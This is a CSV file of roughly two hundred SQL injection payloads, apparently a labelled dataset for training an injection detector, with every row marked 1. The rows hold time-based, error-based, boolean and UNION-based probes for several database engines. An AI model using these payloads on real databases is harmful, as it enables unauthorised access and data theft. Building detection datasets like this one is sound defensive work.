Sentence,Label
"1%'  )   and 6537  =  dbms_pipe.receive_message  (  chr  (  76  )  ||chr  (  116  )  ||chr  (  117  )  ||chr  (  65  )  ,5  )   and   (  '%'  =  '",1
1'   )    )    as tley where 3539  =  3539,1
 (  select   (  case when   (  6461  =  1812  )   then 1 else cast  (  1 as int  )  /  (  select 1 from dual  )   end  )   from dual  ) ,1
"1""   )    )     )   and elt  (  1211  =  1211,sleep  (  5   )    )    and    (    (     (  ""ilge"" like ""ilge",1
-6518'   )    )    as vocx where 2539  =  2539 or   (  8652  =  2125  )  *2125--,1
"1%"" and 9661  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --",1
"1%'  )   or 8466  =  benchmark  (  5111111,md5  (  1x694a4745   )    )    and   (  '%'  =  '",1
"1%""  )   or exp  (  ~  (  select * from   (  select concat  (  1x7171716a71,  (  select   (  elt  (  6271  =  6271,1   )    )     )  ,1x717a767a71,1x78   )    )   x   )    )    and   (  ""%""  =  """,1
"1""  )   as fkco where 8877  =  8877 or   (  select 9173 from  (  select count  (  *  )  ,concat  (  1x7171716a71,  (  select   (  elt  (  9173  =  9173,1   )    )     )  ,1x717a767a71,floor  (  rand  (  1  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )  --",1
"select like  (  'abcdefg',upper  (  hex  (  randomblob  (  511111111/2   )    )      )    )    and    (    (   ""ewsr"" like ""ewsr",1
"1""   )    )    and 5421  =  4814--",1
1'||  (  select 'zzkx' where 3271  =  3271 and 2116  =  2116,1
"  (  select   (  case when   (  3531  =  3531  )   then   (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )   else 3531 end   )    )   ",1
select   (  case when   (  4215  =  9574  )   then 4215 else 1/  (  select 1  )   end  )  --,1
"-3862'   )    )    union all select 2495,2495,2495,2495,2495,2495,2495--",1
"1'  )   as pfwt where 8448  =  8448 union all select null,null,null,null,null,null,null,null,null#",1
1'  )   and   (  3121  =  3121  )  *6713 and   (  'rskq'  =  'rskq,1
"-5215'   )    )    union all select 8592,8592,8592,8592,8592,8592--",1
"1""   )    )    and 6511  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )   and    (    (   ""vjvz"" like ""vjvz",1
"1   )    )    and 6511  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )   and    (    (   5211  =  5211",1
1'   )    )    and 2832  =  4165--,1
1'+  (  select qpaf where 7859  =  7859 or   (  select * from   (  select  (  sleep  (  5   )    )     )  ydpu   )    )   +',1
"1'   )    )     )   and char  (  121  )  ||char  (  116  )  ||char  (  117  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  9981  )  ,1  )  ,5111111111  )  ,null  )   and    (    (     (  'cenk'  =  'cenk",1
"1'  )   and 3824  =  benchmark  (  5111111,md5  (  1x76555642   )    )    and   (  'urxs'  =  'urxs",1
select pg_sleep  (  5  )   and    (    (   'vxxg'  =  'vxxg,1
"-5518  )   as yvqm where 7361  =  7361 union all select 7361,7361#",1
-3359' order by 1--,1
"-6618""   )    )     )   order by 1#",1
"1'+  (  select 'drvv' where 5622  =  5622 and 3581  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",1
"1""   )    )    and 8594  =    (  select 8594 from pg_sleep  (  5   )    )   --",1
"-3628"" or 1571  =  convert  (  int,  (  select char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  116  )  +char  (  113  )  +  (  select   (  case when   (  1571  =  1571  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )  ",1
"-6492'  )   union all select 7214,7214--",1
"1""  )   or 5286  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )   and   (  ""nnmz"" like ""nnmz",1
"-1755%' union all select 2615,2615,2615,2615,2615,2615#",1
"-9659   )    )     )   union all select 8665,8665,8665,8665,8665,8665,8665--",1
"1',  (  select 2*  (  if   (    (   select * from   (  select concat  (  1x7171716a71,  (  select   (  elt  (  9693  =  9693,1   )    )     )  ,1x717a767a71,1x78   )    )   s  )  , 8446744173719551611, 8446744173719551611   )    )     )  ",1
1' where 5161  =  5161,1
"-7574%""  )   or 5123  =  ctxsys.drithsx.sn  (  5123,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  116  )  ||chr  (  113  )  ||  (  select   (  case when   (  5123  =  5123  )   then 1 else 1 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   and   (  ""%""  =  """,1
"-9347'  )   union all select 3884,3884#",1
"1"" where 5333  =  5333 and char  (  119  )  ||char  (  79  )  ||char  (  71  )  ||char  (  91  )    =  regexp_substring  (  repeat  (  right  (  char  (  5112  )  ,1  )  ,5111111111  )  ,null  )  --",1
"-4817' where 3232  =  3232 or make_set  (  6599  =  5179,5179  )  --",1
1 where 1115  =  1115,1
"  (  select like  (  'abcdefg',upper  (  hex  (  randomblob  (  511111111/2   )    )      )    )     )  ",1
"1%"" and 4241  =  convert  (  int,  (  select char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  116  )  +char  (  113  )  +  (  select   (  case when   (  4241  =  4241  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )   and ""%""  =  """,1
"1'  )   and row  (  6237,7469  )  >  (  select count  (  *  )  ,concat  (  1x7171716a71,  (  select   (  elt  (  6237  =  6237,1   )    )     )  ,1x717a767a71,floor  (  rand  (  1  )  *2   )    )   x from   (  select 5192 union select 3785 union select 3931 union select 7158  )  a group by x  )  ",1
"1  )   or 8514  =  benchmark  (  5111111,md5  (  1x544d5a4c   )    )   #",1
"1'+  (  select 'nmhy' where 2919  =  2919 and 8189  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  --",1
1'||  (  select 'boxx' where 2138  =  2138 and 9198  =  9198--,1
"1%""  )   and 8189  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  --",1
"-4314' where 1115  =  1115 union all select 1115,1115#",1
"1  )   and 3824  =  benchmark  (  5111111,md5  (  1x76555642   )    )   ",1
1'+  (  select 'zjvx' where 4683  =  4683 and 6969  =    (  select 6969 from pg_sleep  (  5   )    )     )  +',1
"1%'   )    )     )   or elt  (  6272  =  6272,sleep  (  5   )    )    and    (    (     (  '%'  =  '",1
"1'||  (  select 'txyy' where 6511  =  6511 procedure analyse  (  extractvalue  (  9255,concat  (  1x5c,  (  benchmark  (  5111111,md5  (  1x52515a51   )    )      )    )     )  ,1   )    )   ||'",1
"1  )   where 8164  =  8164 or 2367  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --",1
1'  )   and 7756  =  dbms_utility.sqlid_to_sqlhash   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  116  )  ||chr  (  113  )  ||  (  select   (  case when   (  7756  =  7756  )   then 1 else 1 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   and   (  'nxkp' like 'nxkp,1
-2625'   )    )    or 3138  =  3138,1
"1'   )    )    and 8514  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )   and    (    (   'miba'  =  'miba",1
"1"" or 9643  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )   and ""vwep"" like ""vwep",1
"1%""  )   procedure analyse  (  extractvalue  (  5841,concat  (  1x5c,1x7171716a71,  (  select   (  case when   (  5841  =  5841  )   then 1 else 1 end   )    )   ,1x717a767a71   )    )   ,1  )   and   (  ""%""  =  """,1
"1'   )    )    as orvy where 7271  =  7271 union all select null,null,null,null,null,null,null,null#",1
"1""   )    )     )   and 2853  =  cast   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  116  )  ||chr  (  113   )    )   ||  (  select   (  case when   (  2853  =  2853  )   then 1 else 1 end   )    )   ::text||  (  chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    as numeric  )   and    (    (     (  ""dwcy""  =  ""dwcy",1
"-1218' union all select 2663,2663,2663,2663--",1
1%'  )   rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  vwyq  )  #,1
"1  )   union all select null,null,null#",1
"select dbms_pipe.receive_message  (  chr  (  66  )  ||chr  (  67  )  ||chr  (  79  )  ||chr  (  111  )  ,5  )   from dual and    (    (     (  ""oiuw""  =  ""oiuw",1
"1'   )    )     )   procedure analyse  (  extractvalue  (  9627,concat  (  1x5c,  (  benchmark  (  5111111,md5  (  1x4b774c75   )    )      )    )     )  ,1  )  #",1
"select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 and    (    (     (  'qvoy'  =  'qvoy",1
"-5161'  )   as kgjw where 9619  =  9619 union all select 9619,9619--",1
1%'   )    )     )   waitfor delay '1:1:5' and    (    (     (  '%'  =  ',1
"-5187""  )   union all select 3373,3373#",1
"-1817'   )    )    union all select 9853,9853,9853,9853,9853,9853#",1
"-7241'   )    )    union all select 8164,8164,8164#",1
1'+  (  select 'rajp' where 3311  =  3311,1
"1%'   )    )     )   and   (  select 2*  (  if   (    (   select * from   (  select concat  (  1x7171716a71,  (  select   (  elt  (  3484  =  3484,1   )    )     )  ,1x717a767a71,1x78   )    )   s  )  , 8446744173719551611, 8446744173719551611   )    )     )   and    (    (     (  '%'  =  '",1
"1""  )   and extractvalue  (  7982,concat  (  1x5c,1x7171716a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,1x717a767a71   )    )    and   (  ""thkh"" like ""thkh",1
"1   )    )    and 9254  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --",1
-1761   )    )     )   or   (  8459  =  8459  )  *4916 and    (    (     (  1541  =  1541,1
"-5819%""   )    )    or 4144  =    (  select upper  (  xmltype  (  chr  (  61  )  ||chr  (  58  )  ||chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  116  )  ||chr  (  113  )  ||  (  select   (  case when   (  4144  =  4144  )   then 1 else 1 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113  )  ||chr  (  62   )    )     )   from dual  )   and    (    (   ""%""  =  """,1
"call regexp_substring  (  repeat  (  right  (  char  (  3712  )  ,1  )  ,511111111  )  ,null   )    )   ||'",1
"1"" where 3692  =  3692 union all select null,null--",1
1   )    )    as uqsi where 1644  =  1644 and 9198  =  9198--,1
"-2423'   )    )     )   union all select 8256,8256,8256,8256,8256,8256,8256,8256--",1
select   (  case when   (  2717  =  2634  )   then 2717 else 2717*  (  select 2717 from mysql.db  )   end  )  #,1
"-5539""  )   union all select 6189,6189,6189,6189,6189,6189,6189,6189,6189--",1
1%'   )    )    and sleep  (  5  )  #,1
"-3791""  )   as ojgb where 5925  =  5925 union all select 5925,5925#",1
1'  )   where 2191  =  2191,1
1' and 1661  =  1244 and 'dcha'  =  'dcha,1
"-1372%'   )    )     )   union all select 8413,8413,8413,8413#",1
1 where 9774  =  9774,1
1   )    )    and 3249  =  2985,1
"-1134 union all select 1297,1297,1297,1297,1297,1297,1297,1297,1297--",1
"1'  )   as fxuk where 6184  =  6184 and make_set  (  9292  =  2785,2785  )  --",1
"1   )    )    as jfae where 6684  =  6684 and 2716  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )  --",1
"1   )    )    or 4915  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",1
"1'   )    )    and elt  (  3114  =  3114,sleep  (  5   )    )   #",1
"1""   )    )    as tmpz where 7224  =  7224 and make_set  (  3579  =  1145,1145  )  --",1
"-1184 where 1181  =  1181 or make_set  (  9354  =  9354,7185  )  --",1
"1"" where 1132  =  1132 or 6793  =    (  select 6793 from pg_sleep  (  5   )    )   --",1
1' where 1153  =  1153 or   (  select * from   (  select  (  sleep  (  5   )    )     )  ydpu  )  --,1
"1'||  (  select 'hrpa' where 1973  =  1973 union all select null,null,null,null,null,null,null,null,null--",1
"1'  )   and 6537  =  dbms_pipe.receive_message  (  chr  (  76  )  ||chr  (  116  )  ||chr  (  117  )  ||chr  (  65  )  ,5  )   and   (  'rgue' like 'rgue",1
"1""  )   where 2215  =  2215 and 3754  =    (  select upper  (  xmltype  (  chr  (  61  )  ||chr  (  58  )  ||chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  116  )  ||chr  (  113  )  ||  (  select   (  case when   (  3754  =  3754  )   then 1 else 1 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113  )  ||chr  (  62   )    )     )   from dual  )  --",1
1 and   (  select * from   (  select  (  sleep  (  5   )    )     )  fzno  )  # bkjl,1
1  )   as ilqx where 8547  =  8547,1
"1""  )   and   (  select * from   (  select  (  sleep  (  5   )    )     )  gcrr  )  #",1
"1'   )    )    and char  (  119  )  ||char  (  79  )  ||char  (  71  )  ||char  (  91  )    =  regexp_substring  (  repeat  (  right  (  char  (  5112  )  ,1  )  ,5111111111  )  ,null  )  --",1
"1""  )   where 6236  =  6236 or 8514  =  benchmark  (  5111111,md5  (  1x544d5a4c   )    )   #",1
"1""   )    )    and   (  7467  =  7962  )  *7962 and    (    (   ""nhld""  =  ""nhld",1
1   )    )     )   and 6241  =    (  'qqpjq'||  (  select case 6241 when 6241 then 1 else 1 end from rdb$database  )  ||'qzvzq'  )   and    (    (     (  6162  =  6162,1
"select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3 and    (    (   'xiyl' like 'xiyl",1
select   (  case when   (  7852  =  7476  )   then 7852 else 7852*  (  select 7852 from mysql.db  )   end  )  #,1
1'  )   and   (  select * from   (  select  (  sleep  (  5   )    )     )  fzno  )   and   (  'eqfh'  =  'eqfh,1
"-1475""  )   union all select 8611,8611,8611#",1
"1'  )   as saqp where 6612  =  6612 union all select null,null,null,null,null,null,null--",1
"1'   )    )     )   and 8189  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  --",1
select   (  case when   (  5752  =  6136  )   then 1 else 5752*  (  select 5752 from master..sysdatabases  )   end  )  --,1
1'||  (  select 'sbft' where 8748  =  8748,1
"1""  )   where 2181  =  2181 and make_set  (  8413  =  8413,8899  )  --",1
"-7194'||  (  select 'gbrx' from dual where 6215  =  6215 union all select 6215,6215,6215,6215,6215,6215,6215#",1
"1"" where 8189  =  8189",1
-2936  )   or 6872  =  6872,1
"1'||  (  select 'ryom' where 1134  =  1134 or char  (  119  )  ||char  (  111  )  ||char  (  99  )  ||char  (  121  )    =  regexp_substring  (  repeat  (  right  (  char  (  1441  )  ,1  )  ,5111111111  )  ,null  )  --",1
"1%'   )    )     )   union all select null,null,null,null,null,null,null#",1
"1'||  (  select 'xjtq' from dual where 5719  =  5719 or 8315  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3   )    )   ||'",1
"1%""   )    )    or 8466  =  benchmark  (  5111111,md5  (  1x694a4745   )    )    and    (    (   ""%""  =  """,1
"1%""  )   rlike   (  select   (  case when   (  7736  =  7642  )   then 1 else 1x28 end   )    )    and   (  ""%""  =  """,1
1'  )   and 7533  =  7533 and   (  'dbjq'  =  'dbjq,1
"1""  )   where 9827  =  9827",1
"1""  )   as lrew where 6167  =  6167 union all select null,null,null,null,null,null,null#",1
"1  )   as hlit where 4973  =  4973 procedure analyse  (  extractvalue  (  9627,concat  (  1x5c,  (  benchmark  (  5111111,md5  (  1x4b774c75   )    )      )    )     )  ,1  )  #",1
"1  )   as obhj where 1789  =  1789 or 2633  =  dbms_pipe.receive_message  (  chr  (  112  )  ||chr  (  65  )  ||chr  (  65  )  ||chr  (  113  )  ,5  )  --",1
1'  )   where 1512  =  1512 and 3754  =    (  select upper  (  xmltype  (  chr  (  61  )  ||chr  (  58  )  ||chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  116  )  ||chr  (  113  )  ||  (  select   (  case when   (  3754  =  3754  )   then 1 else 1 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113  )  ||chr  (  62   )    )     )   from dual  )  --,1
"1'  )   union all select null,null,null,null,null,null,null--",1
"1%"" waitfor delay '1:1:5' and ""%""  =  """,1
1'   )    )    and 4242  =  5831 and    (    (   'xflh' like 'xflh,1
"-5278""   )    )     )   union all select 5264,5264,5264#",1
-3462'   )    )    or 4493  =  utl_inaddr.get_host_address  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  116  )  ||chr  (  113  )  ||  (  select   (  case when   (  4493  =  4493  )   then 1 else 1 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    and    (    (   'cxku' like 'cxku,1
1'||  (  select 'boib' where 9595  =  9595,1
"1%' and 8312  =  dbms_pipe.receive_message  (  chr  (  69  )  ||chr  (  79  )  ||chr  (  111  )  ||chr  (  68  )  ,5  )  --",1
"-4934"" union all select 5119,5119,5119,5119,5119--",1
"1%'   )    )     )   or updatexml  (  1818,concat  (  1x2e,1x7171716a71,  (  select   (  elt  (  1818  =  1818,1   )    )     )  ,1x717a767a71  )  ,8666  )   and    (    (     (  '%'  =  '",1
"1' and char  (  119  )  ||char  (  79  )  ||char  (  71  )  ||char  (  91  )    =  regexp_substring  (  repeat  (  right  (  char  (  5112  )  ,1  )  ,5111111111  )  ,null  )  --",1
"1'||  (  select 'vixv' from dual where 7714  =  7714 union all select null,null,null,null,null--",1
"1%""   )    )     )   and 3715 in    (    (   char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  116  )  +char  (  113  )  +  (  select   (  case when   (  3715  =  3715  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )   and    (    (     (  ""%""  =  """,1
"1'||  (  select 'fbsr' where 7899  =  7899 and elt  (  4249  =  4249,7259   )    )   ||'",1
"1'  )   where 6156  =  6156 or row  (  1145,7562  )  >  (  select count  (  *  )  ,concat  (  1x7171716a71,  (  select   (  elt  (  1145  =  1145,1   )    )     )  ,1x717a767a71,floor  (  rand  (  1  )  *2   )    )   x from   (  select 8488 union select 5584 union select 3151 union select 1211  )  a group by x  )  --",1
"iif  (  4638  =  8258,1,1/1  )  ",1
"-3873%'   )    )    or 1 group by concat  (  1x7171716a71,  (  select   (  case when   (  4232  =  4232  )   then 1 else 1 end   )    )   ,1x717a767a71,floor  (  rand  (  1  )  *2   )    )    having min  (  1  )  #",1
"1'  )   as nvqk where 3917  =  3917 or 1122  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --",1
1'   )    )     )   and   (  select * from   (  select  (  sleep  (  5   )    )     )  fzno  )   and    (    (     (  'acml' like 'acml,1
"1'   )    )     )   union all select null,null,null,null--",1
"1""  )   as rdvm where 6361  =  6361 and sleep  (  5  )  --",1
"1""   )    )    or char  (  68  )  ||char  (  69  )  ||char  (  97  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  5389  )  ,1  )  ,5111111111  )  ,null  )   and    (    (   ""onhh""  =  ""onhh",1
"1' and exp  (  ~  (  select * from   (  select concat  (  1x7171716a71,  (  select   (  elt  (  8191  =  8191,1   )    )     )  ,1x717a767a71,1x78   )    )   x   )    )    and 'blie'  =  'blie",1
"1"" where 7245  =  7245 and 9198  =  9198--",1
"1'  )    (  select   (  case when   (  4587  =  4587  )   then regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,1  )  ,511111111  )  ,null  )   else char  (  76  )  ||char  (  65  )  ||char  (  112  )  ||char  (  72  )   end  )   from   (  values  (  1   )    )     )   and   (  'yqmv'  =  'yqmv",1
"1' and 3212  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  511111111/2   )    )      )    )   ",1
"1 and 6537  =  dbms_pipe.receive_message  (  chr  (  76  )  ||chr  (  116  )  ||chr  (  117  )  ||chr  (  65  )  ,5  )  ",1
"1' and 3824  =  benchmark  (  5111111,md5  (  1x76555642   )    )    and 'pbin'  =  'pbin",1
"1""   )    )     )   and 4124  =  7245 and    (    (     (  ""tuom""  =  ""tuom",1
1'  )   as irnj where 7274  =  7274 and 6969  =    (  select 6969 from pg_sleep  (  5   )    )   --,1
1'   )    )    as fqia where 1936  =  1936 and   (  select * from   (  select  (  sleep  (  5   )    )     )  fzno  )  --,1
-1479%' or 5211  =  3398--,1
1'+  (  select enzd where 6146  =  6146 and   (  3121  =  3121  )  *6713  )  +',1
if  (  8264  =  1939  )   select 8264 else drop function nsoq--,1
"1  )   as skby where 4269  =  4269 or elt  (  6272  =  6272,sleep  (  5   )    )   --",1
"1'||  (  select 'hfbt' where 7214  =  7214 union all select null,null,null,null,null,null,null,null,null,null--",1
"-5616   )    )    or 1 group by concat  (  1x7171716a71,  (  select   (  case when   (  4232  =  4232  )   then 1 else 1 end   )    )   ,1x717a767a71,floor  (  rand  (  1  )  *2   )    )    having min  (  1  )  #",1
"1""  )   and 7756  =  dbms_utility.sqlid_to_sqlhash   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  116  )  ||chr  (  113  )  ||  (  select   (  case when   (  7756  =  7756  )   then 1 else 1 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   and   (  ""gozk""  =  ""gozk",1
"1""   )    )     )   union all select null,null,null,null,null,null--",1
"1   )    )    or elt  (  5873  =  5873,sleep  (  5   )    )   #",1
"-3815""   )    )     )   union all select 9123,9123,9123,9123,9123,9123,9123,9123#",1
"-4971'  )   union all select 4625,4625,4625,4625,4625,4625,4625,4625#",1
"1'  )   or   (  select 2*  (  if   (    (   select * from   (  select concat  (  1x7171716a71,  (  select   (  elt  (  8113  =  8113,1   )    )     )  ,1x717a767a71,1x78   )    )   s  )  , 8446744173719551611, 8446744173719551611   )    )     )  ",1
"1""   )    )     )   procedure analyse  (  extractvalue  (  9627,concat  (  1x5c,  (  benchmark  (  5111111,md5  (  1x4b774c75   )    )      )    )     )  ,1  )  #",1
1'  )   where 8214  =  8214,1
"1'   )    )     )   and make_set  (  8413  =  8413,8899  )   and    (    (     (  'llfp'  =  'llfp",1
1'   )    )    as wuws where 6917  =  6917 union all select null#,1
"1 and elt  (  2771  =  3669,3669  )  # sfls",1
"-3566' where 3641  =  3641 union all select 3641,3641,3641,3641,3641#",1
"1""   )    )    as riui where 2615  =  2615",1
"1' and make_set  (  8413  =  8413,8899  )   and 'lnwe'  =  'lnwe",1
"-5143%'   )    )     )   union all select 5861,5861,5861,5861,5861#",1
1  )   waitfor delay '1:1:5'--,1
-8519%'   )    )    or 4493  =  utl_inaddr.get_host_address  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  116  )  ||chr  (  113  )  ||  (  select   (  case when   (  4493  =  4493  )   then 1 else 1 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    and    (    (   '%'  =  ',1
"1"" and 7756  =  dbms_utility.sqlid_to_sqlhash   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  116  )  ||chr  (  113  )  ||  (  select   (  case when   (  7756  =  7756  )   then 1 else 1 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   and ""jgcv""  =  ""jgcv",1
"1' in boolean mode  )   and 8417  =    (  select count  (  *  )   from generate_series  (  1,5111111   )    )   #",1
"1'   )    )    as peeo where 5356  =  5356 and elt  (  4722  =  2382,2382  )  --",1
"1'+  (  select ijck where 9961  =  9961 or   (  select 2*  (  if   (    (   select * from   (  select concat  (  1x7171716a71,  (  select   (  elt  (  8113  =  8113,1   )    )     )  ,1x717a767a71,1x78   )    )   s  )  , 8446744173719551611, 8446744173719551611   )    )      )    )   +'",1
"1'  )   where 2121  =  2121 or 4915  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",1
"1'  )   or 9643  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )   and   (  'xjvr'  =  'xjvr",1
"-1271'||  (  select 'mgdi' where 6785  =  6785 union all select 6785,6785#",1
"1""   )    )     )   rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  sgvo  )   and    (    (     (  ""sdps""  =  ""sdps",1
"1"" or 4241  =    (  select 4241 from pg_sleep  (  5   )    )   --",1
1%'   )    )     )   rlike   (  select   (  case when   (  7697  =  3334  )   then 1 else 1x28 end   )    )    and    (    (     (  '%'  =  ',1
"1'||  (  select 'ymac' from dual where 9268  =  9268 or 8466  =  benchmark  (  5111111,md5  (  1x694a4745   )    )     )  ||'",1
waitfor delay '1:1:5' and   (  'gpqx' like 'gpqx,1
"-9997' union all select 9347,9347,9347,9347,9347,9347,9347,9347#",1
1%'   )    )     )   and 7533  =  7533 and    (    (     (  '%'  =  ',1
1'   )    )     )   and 6241  =    (  'qqpjq'||  (  select case 6241 when 6241 then 1 else 1 end from rdb$database  )  ||'qzvzq'  )   and    (    (     (  'bwka'  =  'bwka,1
"-9151 union all select 9346,9346,9346,9346,9346,9346,9346,9346,9346,9346--",1
"1""   )    )    and row  (  6237,7469  )  >  (  select count  (  *  )  ,concat  (  1x7171716a71,  (  select   (  elt  (  6237  =  6237,1   )    )     )  ,1x717a767a71,floor  (  rand  (  1  )  *2   )    )   x from   (  select 5192 union select 3785 union select 3931 union select 7158  )  a group by x  )   and    (    (   ""tbdl"" like ""tbdl",1
"1""   )    )     )   and 5556  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )   and    (    (     (  ""ecoa"" like ""ecoa",1
"1%""  )   rlike sleep  (  5  )  #",1
"1'  )   and elt  (  1211  =  1211,sleep  (  5   )    )    and   (  'gtov' like 'gtov",1
1' in boolean mode  )   and 7756  =  dbms_utility.sqlid_to_sqlhash   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  116  )  ||chr  (  113  )  ||  (  select   (  case when   (  7756  =  7756  )   then 1 else 1 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )  #,1
"1'   )    )    as qwdh where 7581  =  7581 or char  (  117  )  ||char  (  111  )  ||char  (  115  )  ||char  (  111  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,1  )  ,511111111  )  ,null  )  --",1
select case when 3661  =  9315 then 1 else null end--,1
